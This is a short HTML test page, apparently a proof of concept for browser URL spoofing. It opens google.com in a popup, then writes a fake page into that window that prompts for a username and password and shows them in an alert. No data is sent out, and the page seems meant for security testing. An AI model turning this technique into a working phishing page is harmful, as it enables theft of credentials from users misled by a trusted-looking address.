<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Test v6</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>

<h1>Test v5</h1>
<button onclick="spoof()">Open</button>

<script>
function spoof() {

  // 1️⃣ Popup dibuka langsung dari user gesture
  const win = window.open("https://google.com", "_blank");

  if (!win) {
    alert("Popup blocked");
    return;
  }

  // 2️⃣ Konten ditulis ke SAME-ORIGIN window
  win.document.open();
  win.document.write(`
<h1>This is not Google!</h1>
<button onclick="
  let username = prompt('Enter your username');
  let password = prompt('Enter your password');
  alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
">Click me</button>
  `);
  win.document.close();
}
</script>

</body>
</html>
